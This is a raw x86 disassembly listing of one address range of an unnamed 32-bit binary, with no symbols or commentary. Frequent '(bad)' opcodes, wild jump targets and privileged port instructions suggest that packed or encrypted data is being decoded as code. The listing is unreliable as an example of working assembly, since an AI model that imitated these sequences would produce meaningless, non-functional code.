  40ca4c:	arpl   WORD PTR [ebp+0x5a3db60],bx
  40ca52:	(bad)  
  40ca53:	mov    ch,0x6c
  40ca55:	sbb    eax,0x263eb200
  40ca5a:	call   FWORD PTR [ecx+0x6c8d554b]
  40ca60:	xchg   ebx,eax
  40ca61:	cs (bad) 
  40ca63:	ficom  WORD PTR [edi+0x4102e7d3]
  40ca69:	jmp    DWORD PTR es:[eax-0x1e]
  40ca6d:	xor    al,0xf7
  40ca6f:	(bad)  
  40ca70:	js     0x40ca8f
  40ca72:	or     DWORD PTR [ebx-0x1695d9b8],0x283a1df8
  40ca7c:	addr16 es mov ch,0x99
  40ca80:	push   eax
  40ca81:	call   FWORD PTR es:[esi+0x6de7f9b2]
  40ca88:	add    ah,BYTE PTR [esi]
  40ca8a:	jmp    DWORD PTR [eax-0x1e]
  40ca8d:	and    bh,dh
  40ca8f:	xchg   BYTE PTR [eax],bh
  40ca91:	fwait
  40ca92:	call   DWORD PTR [eax]
  40ca94:	xchg   esi,eax
  40ca95:	fild   WORD PTR [eax-0x17]
	...
  40caa4:	add    BYTE PTR [eax],al
  40caa6:	add    BYTE PTR [ecx+0x7876f05a],cl
  40caac:	and    al,0xff
  40caae:	fmul   QWORD PTR [ebp+ebp*1+0x69]
  40cab2:	test   BYTE PTR [eax+0x5b6c8924],cl
  40cab8:	sbb    al,0xff
  40caba:	dec    esi
  40cabb:	int    0x24
  40cabd:	addr16 inc ebx
  40cabf:	xor    eax,0x923dffc6
  40cac4:	adc    eax,0x244836f7
  40cac9:	jne    0x40caa8
  40cacb:	push   0x3826a4d3
  40cad0:	mov    es,WORD PTR [ebp-0xdbcfef]
  40cad6:	and    DWORD PTR [eax-0x53],0x2
  40cada:	shl    BYTE PTR [edi],cl
  40cadc:	and    eax,0xd92700fe
  40cae1:	idiv   bh
  40cae3:	fucomp st(7)
  40cae5:	je     0x40caf3
  40cae7:	bound  ebx,QWORD PTR [esp+eiz*4]
  40caea:	(bad)  
  40caeb:	mov    ebp,0xa5dc84a1
  40caf0:	out    dx,eax
  40caf1:	dec    BYTE PTR [ebp-0x917b9]
  40caf7:	lea    edi,[eax]
  40caf9:	adc    edx,DWORD PTR [bx+di+0x4a]
  40cafd:	(bad)  
  40cafe:	(bad)  
  40caff:	daa    
  40cb00:	fdiv   st,st(6)
  40cb02:	(bad)  
  40cb03:	fucomp st(7)
  40cb05:	xor    al,0x27
  40cb07:	arpl   WORD PTR [edx-0x1],cx
  40cb0a:	out    0x0,eax
	...
  40cb18:	add    BYTE PTR [eax],al
  40cb1a:	stos   BYTE PTR es:[edi],al
  40cb1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb1c:	(bad)  
  40cb1d:	call   DWORD PTR [ecx+0x91973c8]
  40cb23:	lods   eax,DWORD PTR ds:[esi]
  40cb24:	fcomip st,st(7)
  40cb26:	int    0xef
  40cb28:	add    esi,DWORD PTR [ebp+0x6a]
  40cb2b:	out    dx,eax
  40cb2c:	das    
  40cb2d:	(bad)  
  40cb2e:	test   edi,0x38ddfff6
  40cb34:	out    0xdd,eax
  40cb36:	stos   DWORD PTR es:[edi],eax
  40cb37:	out    dx,eax
  40cb38:	(bad)  
  40cb39:	jmp    0x40cb71
  40cb3b:	and    edi,DWORD PTR [edi-0x18c7cb8c]
  40cb41:	shr    ebx,1
  40cb43:	out    dx,al
  40cb44:	inc    bh
  40cb46:	(bad)  
  40cb47:	shl    dh,1
  40cb49:	call   FWORD PTR [ebp+0x3afffff5]
  40cb4f:	popf   
  40cb50:	test   al,dl
  40cb52:	push   ebp
  40cb53:	out    dx,eax
  40cb54:	(bad)  
  40cb55:	push   eax
  40cb56:	and    cl,BYTE PTR [esi]
  40cb58:	cmp    eax,DWORD PTR [ecx-0x6]
  40cb5b:	out    dx,al
  40cb5c:	mov    ah,0xf0
  40cb5e:	gs out dx,eax
  40cb60:	(bad)  
  40cb61:	call   edi
  40cb63:	sbb    esp,edi
  40cb65:	lds    esp,FWORD PTR [ebx-0x2e]
  40cb68:	sub    edi,edi
  40cb6a:	fisubr DWORD PTR [eax+0xae4f74e]
  40cb70:	xchg   BYTE PTR [ebp-0xd6e539],bh
  40cb76:	arpl   WORD PTR [ebx],bp
  40cb78:	jg     0x40cb15
  40cb7a:	arpl   WORD PTR [esi],bp
  40cb7c:	add    eax,DWORD PTR [ebx+0x0]
	...
  40cb8a:	add    BYTE PTR [eax],al
  40cb8c:	add    BYTE PTR [esi],al
  40cb8e:	cmp    dh,BYTE PTR [ecx]
  40cb90:	(bad)  
  40cb91:	mov    esp,0xe583f82d
  40cb96:	sub    eax,0x90e00003
  40cb9b:	sbb    al,0xf7
  40cb9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb9e:	dec    edx
  40cb9f:	add    al,0xf
  40cba1:	out    0xac,eax
  40cba3:	add    eax,DWORD PTR [eax]
  40cba5:	arpl   si,ax
  40cba7:	adc    eax,DWORD PTR [eax]
  40cba9:	jl     0x40cb5e
  40cbab:	sub    BYTE PTR [ebp+0x5b],dh
  40cbae:	jbe    0x40cbd8
  40cbb0:	popf   
  40cbb1:	jl     0x40cb35
  40cbb3:	sub    DWORD PTR [ebp-0xd67d79],esi
  40cbb9:	ins    BYTE PTR es:[edi],dx
  40cbba:	clc    
  40cbbb:	sti    
  40cbbc:	out    0x13,eax
  40cbbe:	lods   al,BYTE PTR ds:[esi]
  40cbbf:	sub    bh,bh
  40cbc1:	pop    esp
  40cbc2:	ficomp DWORD PTR [ebx]
  40cbc4:	not    DWORD PTR [esp+ebx*4+0x28]
  40cbc8:	jne    0x40cc25
  40cbca:	test   dh,al
  40cbcc:	popf   
  40cbcd:	inc    esp
  40cbce:	lods   al,BYTE PTR ds:[esi]
  40cbcf:	sub    BYTE PTR [ebp-0xd743b9],dh
  40cbd5:	xor    al,0x42
  40cbd7:	sti    
  40cbd8:	out    0x77,eax
  40cbda:	mov    dl,0x28
  40cbdc:	jmp    DWORD PTR [edx+eiz*4]
  40cbdf:	dec    ebx
  40cbe0:	neg    DWORD PTR [esp+eiz*8]
  40cbe3:	sub    BYTE PTR [ebp+0x6b],dh
  40cbe6:	les    edi,FWORD PTR [edi]
  40cbe8:	popf   
  40cbe9:	or     al,0xf4
  40cbeb:	sub    BYTE PTR [ebp+0x291e0627],dh
	...
  40cbfd:	add    BYTE PTR [eax],al
  40cbff:	add    ah,bh
  40cc01:	and    dl,BYTE PTR [ebx+edi*8+0x2976fdfc]
  40cc08:	in     al,dx
  40cc09:	xchg   BYTE PTR [eax+edx*2-0x14],cl
  40cc0d:	and    al,BYTE PTR [esi]
  40cc0f:	add    al,0x57
  40cc11:	(bad)  
  40cc12:	imul   esp,DWORD PTR [edi-0x4d],0x6728f61a
  40cc19:	cwde   
  40cc1a:	fidivr DWORD PTR [esi+ebx*8+0x39]
  40cc1e:	fisubr WORD PTR [eax]
  40cc20:	mov    esp,0x2e291922
  40cc25:	or     eax,0x22ce8fc1
  40cc2a:	into   
  40cc2b:	sbb    al,0x59
  40cc2d:	scas   eax,DWORD PTR es:[edi]
  40cc2e:	call   0xd14de25b
  40cc33:	jnp    0x40cc2b
  40cc35:	and    dh,BYTE PTR [esi-0x49d629d8]
  40cc3b:	sub    BYTE PTR [ebp+ebp*1+0x227c639d],al
  40cc42:	sahf   
  40cc43:	outs   dx,BYTE PTR ds:[esi]
  40cc44:	xchg   DWORD PTR [edx],ebx
  40cc46:	xchg   esi,eax
  40cc47:	sub    BYTE PTR [ebx+0x2c],bh
  40cc4a:	dec    ecx
  40cc4b:	sub    BYTE PTR [edx+eiz*1+0x3c],ah
  40cc4f:	sbb    edx,DWORD PTR [edx+eiz*1+0x7e]
  40cc53:	sbb    esi,DWORD PTR ds:0x4c287665
  40cc59:	pop    eax
  40cc5a:	lea    esi,[eax]
  40cc5c:	inc    esp
  40cc5d:	and    dl,BYTE PTR [ecx+0x54]
  40cc60:	add    esp,DWORD PTR [edx]
  40cc62:	pop    esi
  40cc63:	sub    BYTE PTR [eax],al
	...
  40cc71:	add    BYTE PTR [eax],al
  40cc73:	out    dx,al
  40cc74:	cmp    BYTE PTR [esi+0x28],bl
  40cc77:	sub    al,0x2d
  40cc79:	and    DWORD PTR [ebx+0x24],esp
  40cc7c:	and    al,BYTE PTR [esi+0x6e]
  40cc7f:	adc    ebx,DWORD PTR [edx]
  40cc81:	sub    BYTE PTR ds:[eax+ebx*4],dl
  40cc85:	jmp    esp
  40cc87:	cmp    ebx,DWORD PTR [eax+0x20794107]
  40cc8d:	jmp    DWORD PTR [esi]
  40cc8f:	dec    ebx
  40cc90:	pop    eax
  40cc91:	lock push ss
  40cc93:	dec    ebx
  40cc94:	and    ch,al
  40cc96:	inc    ebp
  40cc97:	and    BYTE PTR [edx],0xff
  40cc9a:	push   cs
  40cc9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc9c:	sbb    ecx,ebp
  40cc9e:	xor    al,0x85
  40cca0:	and    bh,bh
  40cca2:	inc    BYTE PTR [esi]
  40cca4:	push   ds
  40cca5:	call   0xff62e4a9
  40ccaa:	and    BYTE PTR [esi],bl
  40ccac:	adc    DWORD PTR [eax],eax
  40ccae:	cmp    al,0x38
  40ccb0:	xor    DWORD PTR [ebx-0x50745b],eax
  40ccb6:	inc    edx
  40ccb7:	pop    ebx
  40ccb8:	and    dh,BYTE PTR [ebp-0x1f]
  40ccbb:	dec    eax
  40ccbc:	arpl   WORD PTR [ebp+0x458c44c6],bx
  40ccc2:	mov    ebp,0x283aecf7
  40ccc7:	and    dh,BYTE PTR [di]
  40ccca:	push   es
  40cccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cccc:	(bad)  
  40cccd:	jmp    DWORD PTR [ebp+0x1be809b2]
  40ccd3:	dec    edx
  40ccd4:	and    bh,bh
  40ccd6:	add    DWORD PTR [eax],eax
	...
  40cce4:	add    BYTE PTR [eax],al
  40cce6:	mov    ds,esi
  40cce8:	inc    eax
  40cce9:	jmp    0xe940d0b6
  40ccee:	loopne 0x40cd10
  40ccf0:	jne    0x40cce3
  40ccf2:	js     0x40cc99
  40ccf4:	cld    
  40ccf5:	jbe    0x40cc7b
  40ccf7:	and    BYTE PTR [ebp+0x6d],dh
  40ccfa:	jl     0x40cc96
  40ccfc:	pop    es
  40ccfd:	push   ecx
  40ccfe:	xchg   esi,eax
  40ccff:	cmp    bh,0x5e
  40cd02:	jbe    0x40cd47
  40cd04:	add    al,0xe9
  40cd06:	adc    ecx,DWORD PTR [esp+ebp*8-0x1e65c98]
  40cd0d:	add    BYTE PTR [ebp+0x300069e8],ah
  40cd13:	push   cs
  40cd14:	push   DWORD PTR [ebp+0x2]
  40cd17:	std    
  40cd18:	jno    0x40ccb7
  40cd1a:	xor    eax,0x464588e8
  40cd1f:	add    DWORD PTR [ebx],0x8d050a01
  40cd25:	test   DWORD PTR [ebp-0x19],ecx
  40cd28:	(bad)  
  40cd29:	jmp    FWORD PTR [edx-0x358e2e04]
  40cd2f:	add    al,0xb
  40cd31:	ror    BYTE PTR [esi+0x38],0x3c
  40cd35:	add    al,0xbb
  40cd37:	add    al,0x0
  40cd39:	ja     0x40ccda
  40cd3b:	jl     0x40cd7d
  40cd3d:	cmp    ecx,DWORD PTR [ebx-0x727a72f7]
  40cd43:	jmp    0xa3a9:0x16afffe
	...
  40cd56:	add    BYTE PTR [eax],al
  40cd58:	add    BYTE PTR [ebp-0x7597b019],dl
  40cd5e:	add    al,0xef
  40cd60:	mov    esi,0x874e87a
  40cd65:	mov    ds:0xb5ffc0e5,al
  40cd6a:	cld    
  40cd6b:	cmc    
  40cd6c:	lahf   
  40cd6d:	(bad)
  40cd70:	jne    0x40cd48
  40cd72:	out    0x74,eax
  40cd74:	or     dl,ah
  40cd76:	sbb    DWORD PTR [edi+edi*8+0x4c1e1d5],0xec8a354a
  40cd81:	leave  
  40cd82:	loopne 0x40cd7f
  40cd84:	push   0x3a
  40cd86:	jle    0x40cda5
  40cd88:	dec    DWORD PTR [edi+0x1c]
  40cd8b:	out    0xd,eax
  40cd8d:	out    0xe6,eax
  40cd8f:	dec    BYTE PTR [ecx+0x67e7ff]
  40cd95:	arpl   WORD PTR [esi],bp
  40cd97:	push   ss
  40cd98:	mov    esi,0x40ea7fbb
  40cd9d:	arpl   WORD PTR [esi],si
  40cd9f:	retf   0xa23a
  40cda2:	cs es jne 0x40ce01
  40cda6:	(bad)  
  40cda7:	dec    edi
  40cda8:	les    eax,FWORD PTR [edi+ebp*8]
  40cdab:	and    eax,0xafe6ff75
  40cdb0:	pop    es
  40cdb1:	or     edx,DWORD PTR [eax-0x78]
  40cdb4:	(bad)  
  40cdb5:	in     al,dx
  40cdb6:	in     al,0x40
  40cdb8:	add    al,0x63
  40cdba:	pop    ecx
  40cdbb:	jp     0x40cda9
	...
  40cdc9:	add    BYTE PTR [eax],al
  40cdcb:	add    dl,ah
  40cdcd:	icebp  
  40cdce:	dec    esi
  40cdcf:	not    esp
  40cdd1:	push   ds
  40cdd2:	ja     0x40ce19
  40cdd4:	iret   
  40cdd5:	jge    0x40cdfd
  40cdd7:	jne    0x40ce4c
  40cdd9:	das    
  40cdda:	scas   eax,DWORD PTR es:[edi]
  40cddb:	or     ecx,ebx
  40cddd:	inc    ecx
  40cdde:	mov    bl,0xff
  40cde0:	mov    ah,0x12
  40cde2:	inc    ebx
  40cde3:	(bad)  
  40cde5:	inc    ecx
  40cde6:	add    eax,DWORD PTR [eax]
  40cde8:	arpl   WORD PTR [edi-0x41],sp
  40cdeb:	mul    DWORD PTR [ebx+0x2e]
  40cdee:	add    eax,DWORD PTR [eax]
  40cdf0:	pushf  
  40cdf1:	call   0x2ea5cd25
  40cdf6:	add    ebp,DWORD PTR [edx+0x63]
  40cdf9:	les    eax,FWORD PTR [ebx]
  40cdfb:	push   0x63
  40cdfd:	hlt    
  40cdfe:	add    ecx,DWORD PTR [ebp-0x732b85e2]
  40ce04:	out    0x81,al
  40ce06:	sub    eax,0x24dd64ff
  40ce0b:	jne    0x40ce68
  40ce0d:	mov    BYTE PTR [edi-0x4c98b405],ch
  40ce13:	dec    DWORD PTR [esp+0x43]
  40ce17:	je     0x40ce77
  40ce19:	test   DWORD PTR [ebp+0x1],ebp
  40ce1c:	arpl   WORD PTR ds:0xedcc9be9,ax
  40ce22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce23:	add    ebp,DWORD PTR [ecx+ebx*4]
  40ce26:	clc    
  40ce27:	sbb    edi,DWORD PTR [edx]
  40ce29:	fs dec esi
  40ce2b:	and    eax,0x77198ab3
	...
  40ce3c:	add    BYTE PTR [eax],al
  40ce3e:	add    dh,bl
  40ce40:	sbb    DWORD PTR [esi],esi
  40ce42:	and    eax,0x1b9ab60c
  40ce47:	sub    ah,BYTE PTR [esi+ebp*1+0x25]
  40ce4b:	jmp    0x111e:0xf42d1988
  40ce52:	aad    0xcd
  40ce54:	push   ds
  40ce55:	push   ss
  40ce56:	ja     0x40ce36
  40ce58:	and    eax,0xb5dc2516
  40ce5d:	nop
  40ce5e:	sahf   
  40ce5f:	cdq    
  40ce60:	(bad)  
  40ce61:	call   0xfe56e48a
  40ce66:	and    al,0xc4
  40ce68:	push   ds
  40ce69:	je     0x40ce62
  40ce6b:	(bad)  
  40ce6c:	lock mov ah,BYTE PTR [esp+esi*4]
  40ce70:	mov    WORD PTR [edi+ebx*1-0x4c],fs
  40ce74:	push   ds
  40ce75:	(bad)  
  40ce76:	cdq    
  40ce77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce79:	ds jmp 0x6f06d3a2
  40ce7f:	xchg   ebx,eax
  40ce80:	push   ss
  40ce81:	mov    esi,0xe4988c24
  40ce86:	sbb    esi,DWORD PTR [ecx+0x63]
  40ce89:	scas   al,BYTE PTR es:[edi]
  40ce8a:	and    al,0xea
  40ce8c:	mov    BYTE PTR [ebp+0x131e742c],dl
  40ce92:	add    al,0xfb
  40ce94:	xchg   edx,eax
  40ce95:	rol    edx,1
  40ce97:	fs pop ds
  40ce99:	push   esp
  40ce9a:	xor    edx,DWORD PTR [esi+ebx*1-0x7a]
  40ce9e:	and    al,0xce
  40cea0:	adc    DWORD PTR [ecx+0x2c],edx
	...
  40ceb2:	add    bl,BYTE PTR [esi]
  40ceb4:	add    BYTE PTR [esi-0x37],dh
  40ceb7:	mov    al,ch
  40ceb9:	jbe    0x40ce42
  40cebb:	push   ds
  40cebc:	push   0xffffffe9
  40cebe:	fcomp  DWORD PTR [edx+0x1e60a83a]
  40cec4:	mov    ch,0x59
  40cec6:	ja     0x40cee6
  40cec8:	dec    DWORD PTR [esi-0x33]
  40cecb:	or     eax,ebp
  40cecd:	and    eax,0x70ff1e81
  40ced2:	lea    eax,[ecx-0x9]
  40ced5:	ss aas 
  40ced7:	stos   DWORD PTR es:[edi],eax
  40ced8:	inc    eax
  40ceda:	jns    0x40ceb6
  40cedc:	inc    eax
  40cedd:	jmp    0x17312721
  40cee2:	inc    edi
  40cee3:	push   ds
  40cee4:	call   FWORD PTR [esp+ebp*8-0x78b73edb]
  40ceeb:	push   ds
  40ceec:	mov    DWORD PTR [eax+ebp*1+0x16],ebp
  40cef0:	(bad)  
  40cef1:	(bad)  
  40cef2:	jmp    0x40cf11
  40cef4:	addr16 sub al,0xbb
  40cef7:	(bad)  
  40cef8:	(bad)  
  40cef9:	in     eax,dx
  40cefa:	dec    esi
  40cefb:	adc    eax,0x1e80e6f7
  40cf00:	jne    0x40ceef
  40cf02:	js     0x40cf6b
  40cf04:	mov    eax,ds:0x858c80d6
  40cf09:	mov    ch,0x78
  40cf0b:	push   ds
  40cf0c:	jmp    FWORD PTR [edx+0x2]
  40cf0f:	sub    edi,esi
  40cf11:	mov    esi,0x30740540
	...
  40cf22:	add    BYTE PTR [eax],al
  40cf24:	add    ah,bl
  40cf26:	pop    edi
  40cf27:	in     al,dx
  40cf28:	mov    dh,0x40
  40cf2a:	push   ds
  40cf2b:	add    BYTE PTR ds:0x91bd82cf,bl
  40cf31:	dec    eax
  40cf32:	push   ds
  40cf33:	(bad)  
  40cf34:	jmp    0xf9a87605
  40cf39:	pusha  
  40cf3a:	sub    al,0xbe
  40cf3c:	add    ch,bl
  40cf3e:	jle    0x40cf47
  40cf40:	call   0x3f6b38
  40cf45:	int    0xbe
  40cf47:	jmp    0x40cf40
  40cf49:	int    0xe8
  40cf4b:	(bad)  
  40cf4c:	jne    0x40cf80
  40cf4e:	icebp  
  40cf4f:	cmp    al,0x9b
  40cf51:	(bad)  
  40cf52:	call   0xe38555
  40cf57:	(bad)  
  40cf58:	jmp    FWORD PTR [ebp+0x6de8077e]
  40cf5e:	pushf  
  40cf5f:	(bad)  
  40cf60:	dec    DWORD PTR [ebp-0x42]
  40cf63:	fcomip st,st(7)
  40cf65:	dec    ebp
  40cf66:	call   0xe78569
  40cf6b:	(bad)  
  40cf6c:	(bad)  
  40cf6d:	cmp    eax,0x5de8077e
  40cf72:	fwait
  40cf73:	(bad)  
  40cf74:	dec    DWORD PTR [ebp-0x42]
  40cf77:	xlat   BYTE PTR ds:[ebx]
  40cf78:	imul   DWORD PTR [ebp-0x18]
  40cf7b:	(bad)  
  40cf7c:	jne    0x40cf50
  40cf7e:	lock or al,0x9b
  40cf81:	int    0xe7
  40cf83:	(bad)  
  40cf84:	mov    ch,0x6e
  40cf86:	add    bh,bh
  40cf88:	inc    DWORD PTR [eax]
	...
  40cf96:	add    BYTE PTR [eax],al
  40cf98:	int    0x7d
  40cf9a:	pop    es
  40cf9b:	call   0x3f6a5d
  40cfa0:	lea    edi,[ebp-0x1872082d]
  40cfa6:	(bad)  
  40cfa7:	jne    0x40cf2b
  40cfa9:	lock lock call 0xffa6:0xb5fee79d
  40cfb2:	(bad)  
  40cfb3:	jmp    DWORD PTR [edx-0x32006305]
  40cfb9:	out    0xb4,eax
  40cfbb:	in     al,dx
  40cfbc:	aad    0xe7
  40cfbe:	(bad)  
  40cfbf:	call   0x40558e
  40cfc4:	arpl   WORD PTR [ebx+0x58],si
  40cfc7:	call   0xe8635b20
  40cfcc:	mov    eax,ds:0xd14cff21
  40cfd2:	test   DWORD PTR ds:[ebx+edx*4+0x2a],0x21aadeda
  40cfdb:	(bad)  
  40cfdc:	out    dx,al
  40cfdd:	lds    ebx,FWORD PTR [ecx]
  40cfdf:	jmp    FWORD PTR [esi+esi*4]
  40cfe2:	push   ecx
  40cfe3:	popf   
  40cfe4:	and    al,0xb3
  40cfe6:	and    DWORD PTR [ebp-0xde4cc9],esi
  40cfec:	or     ebp,edx
  40cfee:	jg     0x40cfef
  40cff0:	or     al,0xdb
  40cff2:	push   edi
  40cff3:	lock or al,0xd3
  40cff6:	and    edi,edi
  40cff8:	jbe    0x40d034
  40cffa:	and    dh,BYTE PTR [ebp+0x0]
	...
  40d009:	add    BYTE PTR [eax],al
  40d00b:	imul   esi,esi,0x9
  40d00e:	(bad)  
  40d00f:	in     al,dx
  40d010:	cli    
  40d011:	and    DWORD PTR [ebp-0xde050d],esi
  40d017:	retf   
  40d018:	lds    edi,FWORD PTR [edi-0x1]
  40d01b:	aam    0x2
  40d01d:	enter  0xbaf7,0x26
  40d021:	and    edi,edi
  40d023:	les    edx,FWORD PTR [edx]
  40d025:	xchg   edi,eax
  40d026:	sti    
  40d027:	retf   
  40d028:	pop    ds
  40d029:	mov    cl,0xff
  40d02b:	mov    ah,0x54
  40d02d:	inc    esi
  40d02e:	or     al,0x63
  40d030:	ror    DWORD PTR [esp+ebp*8+0x6a2069e0],1
  40d037:	arpl   ax,cx
  40d039:	add    bh,bh
  40d03b:	push   cs
  40d03c:	push   ss
  40d03d:	sub    edi,DWORD PTR [edx-0x76dea517]
  40d043:	push   ds
  40d044:	push   edx
  40d045:	lods   al,BYTE PTR ds:[esi]
  40d046:	lea    edi,[eax]
  40d048:	in     eax,dx
  40d049:	add    edi,edi
  40d04b:	cs add eax,0x523eace
  40d051:	sahf   
  40d052:	xchg   edi,eax
  40d053:	pop    esp
  40d054:	sub    eax,0x1b5c1fa9
  40d059:	add    DWORD PTR [edx-0x54173b68],edx
  40d05f:	bound  eax,QWORD PTR ds:0x914483e9
  40d065:	loopne 0x40d092
  40d067:	or     eax,0x34216e19
  40d06c:	xchg   ecx,eax
  40d06d:	and    DWORD PTR fs:[eax],eax
	...
  40d07c:	add    BYTE PTR [eax],al
  40d07e:	mov    dh,0xd
  40d080:	push   ecx
  40d081:	dec    edi
  40d082:	leave  
  40d083:	sbb    dl,BYTE PTR [esi+0x4b]
  40d086:	and    DWORD PTR [edx],eax
  40d088:	jmp    0x6a6aba43
  40d08d:	dec    eax
  40d08e:	lfs    edx,FWORD PTR [ebp+0x8ad04ad]
  40d095:	and    DWORD PTR [esi+0xd],esi
  40d098:	inc    ecx
  40d099:	mov    cl,0xda
  40d09b:	sbb    ah,BYTE PTR [esi]
  40d09d:	mov    esp,DWORD PTR [esi+0x24d77219]
  40d0a3:	in     eax,dx
  40d0a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0a5:	add    ebp,eax
  40d0a7:	fsub   DWORD PTR [ebx+ebp*8-0x1e96fadd]
  40d0ae:	int3   
  40d0af:	xchg   esi,eax
  40d0b0:	xchg   DWORD PTR [ebx+0x3a7dea8],ebp
  40d0b6:	adc    eax,0xb4b1352d
  40d0bb:	sbb    bh,BYTE PTR [ecx]
  40d0bd:	lods   al,BYTE PTR ds:[esi]
  40d0be:	pushf  
  40d0bf:	fisub  WORD PTR [edi]
  40d0c1:	add    al,0xc
  40d0c3:	sub    eax,0x1a9cb081
  40d0c8:	xor    ecx,DWORD PTR ds:0xcec90a3
  40d0ce:	mov    cl,0x91
  40d0d0:	adc    bh,BYTE PTR [edx-0x70ffbc84]
  40d0d6:	inc    ebx
  40d0d7:	sbb    ch,BYTE PTR [eax-0x3f]
  40d0da:	xchg   edi,eax
  40d0db:	(bad)  
  40d0de:	aas    
  40d0df:	and    BYTE PTR [eax+0x9e],ah
	...
  40d0f1:	inc    ebx
  40d0f2:	mov    ch,0x67
  40d0f4:	jmp    0x1fefb59
  40d0f9:	jle    0x40d0d9
  40d0fb:	inc    eax
  40d0fc:	jmp    0xf1b5ec11
  40d101:	js     0x40d16b
  40d103:	shl    DWORD PTR [esi-0x7d],0x2d
  40d107:	(bad)  [ebp-0x7d]
  40d10a:	sbb    ch,bl
  40d10c:	call   0xe97e6b2b
  40d111:	int    0x1b
  40d113:	inc    esi
  40d114:	push   ebp
  40d115:	aaa    
  40d116:	pop    edx
  40d117:	mov    ecx,0xff1a434e
  40d11c:	cmp    edx,DWORD PTR [edx-0x1c4bf923]
  40d122:	sbb    DWORD PTR [ebp+0x35],esi
  40d125:	inc    ebx
  40d126:	nop
  40d127:	pop    es
  40d128:	inc    ecx
  40d129:	or     eax,0x2326ff7c
  40d12e:	mov    eax,0x55c2bc8
  40d133:	push   ebp
  40d134:	bound  ecx,QWORD PTR [esi+eax*4-0x6f7cf23c]
  40d13b:	or     eax,DWORD PTR [esi]
  40d13d:	cmc    
  40d13e:	add    eax,ebp
  40d140:	lds    ecx,FWORD PTR [ebx+0x1a]
  40d143:	jmp    DWORD PTR [eax-0x5b]
  40d146:	sbb    eax,0x1a5474ff
  40d14b:	jne    0x40d13e
  40d14d:	js     0x40d1c0
  40d14f:	xchg   esp,eax
  40d150:	fiadd  WORD PTR [esi+ecx*4+0x4d]
  40d154:	in     eax,0x0
	...
  40d162:	add    BYTE PTR [eax],al
  40d164:	imul   eax,DWORD PTR [ebp+0x74],0xffdbe02b
  40d16b:	dec    DWORD PTR [esi+0x24]
  40d16e:	(bad)  
  40d16f:	jne    0x40d137
  40d171:	call   0xf9f66e0a
  40d176:	dec    edi
  40d177:	jmp    FWORD PTR [edi]
  40d179:	cmc    
  40d17a:	(bad)  
  40d17b:	jne    0x40d143
  40d17d:	push   eax
  40d17e:	(bad)  
  40d17f:	jne    0x40d1f3
  40d181:	in     eax,dx
  40d182:	retf   
  40d183:	xchg   esi,eax
  40d184:	cmc    
  40d185:	clc    
  40d186:	pop    ecx
  40d187:	mov    esi,DWORD PTR [edi-0xb]
  40d18a:	cmp    BYTE PTR [ecx],0x3a
  40d18d:	jle    0x40d198
  40d18f:	push   edx
  40d190:	repnz pop eax
  40d192:	fwait
  40d193:	push   DWORD PTR [ebp+0xeebbf2c]
  40d199:	test   BYTE PTR [ebp+0x10],bh
  40d19c:	cmp    dh,BYTE PTR [ecx+0x7]
  40d19f:	mov    edi,edi
  40d1a1:	adc    al,0xfe
  40d1a3:	jne    0x40d15b
  40d1a5:	mov    BYTE PTR [eax],al
  40d1a7:	mov    ecx,DWORD PTR [eax-0x14]
  40d1aa:	add    DWORD PTR [ebx],ebp
  40d1ac:	cmp    cl,dl
  40d1ae:	ror    DWORD PTR [edx+edi*8],0x5d
  40d1b2:	mov    ch,ah
  40d1b4:	xor    eax,0xafff0b7e
  40d1b9:	or     al,0xe8
  40d1bb:	mov    ecx,0xfffef86c
  40d1c0:	iret   
  40d1c1:	or     BYTE PTR [eax-0x1],dl
  40d1c4:	dec    DWORD PTR [eax+ebp*8]
  40d1c7:	xor    DWORD PTR [eax],eax
	...
  40d1d5:	add    BYTE PTR [eax],al
  40d1d7:	dec    ebp
  40d1d8:	clc    
  40d1d9:	dec    cl
  40d1db:	js     0x40d1e6
  40d1dd:	add    BYTE PTR [ebp+0x51],dl
  40d1e0:	aad    0x82
  40d1e2:	les    ecx,FWORD PTR [edx+0x4953564f]
  40d1e8:	popw   es
  40d1ea:	add    BYTE PTR [esi],cl
  40d1ec:	adc    eax,DWORD PTR [edx+0x7404b67d]
  40d1f2:	or     al,0x63
  40d1f4:	stos   DWORD PTR es:[edi],eax
  40d1f5:	lahf   
  40d1f6:	packsswb mm6,QWORD PTR [edx+0x3a0e8305]
  40d1fd:	add    esi,DWORD PTR [ebp+0x5a]
  40d200:	repz inc ebx
  40d202:	pop    ebx
  40d203:	sbb    al,0xf0
  40d205:	dec    esp
  40d206:	ret    0x2e53
  40d209:	mov    al,BYTE PTR [ebp+0x5f]
  40d20c:	stos   DWORD PTR es:[edi],eax
  40d20d:	and    al,BYTE PTR [edi]
  40d20f:	loopne 0x40d20a
  40d211:	lldt   di
  40d214:	sub    cl,BYTE PTR [edx]
  40d216:	ror    bh,0x25
  40d219:	jmp    0x21c8:0xbddfa8bf
  40d220:	add    ecx,DWORD PTR ds:[ebx-0x1f7dc55a]
  40d227:	pop    esp
  40d228:	stos   DWORD PTR es:[edi],eax
  40d229:	lahf   
  40d22a:	adc    esp,DWORD PTR [ebx+0x3a]
  40d22d:	pop    es
  40d22e:	or     esp,DWORD PTR [ebx]
  40d230:	xor    cl,BYTE PTR [ebx+ebp*1]
  40d233:	and    edx,DWORD PTR [ebx-0x42]
  40d236:	pop    ebp
  40d237:	sub    ch,ah
  40d239:	repnz inc DWORD PTR [eax]
	...
  40d248:	add    BYTE PTR [eax],al
  40d24a:	cmp    ebx,esp
  40d24c:	sbb    eax,0xc7a75775
  40d251:	mov    edi,0xb4368e0
  40d256:	hlt    
  40d257:	push   eax
  40d258:	inc    ebx
  40d259:	call   0xff5f557d
  40d25e:	out    0x94,eax
  40d260:	mov    ebx,0xbe4770e8
  40d266:	shl    DWORD PTR [edx],1
  40d268:	(bad)  
  40d269:	dec    DWORD PTR [ebx]
  40d26b:	adc    eax,DWORD PTR [ebx]
  40d26d:	add    BYTE PTR [ebx+0x1b],ah
  40d270:	mov    si,WORD PTR [esi]
  40d273:	mov    cl,BYTE PTR es:[ebp+0x67]
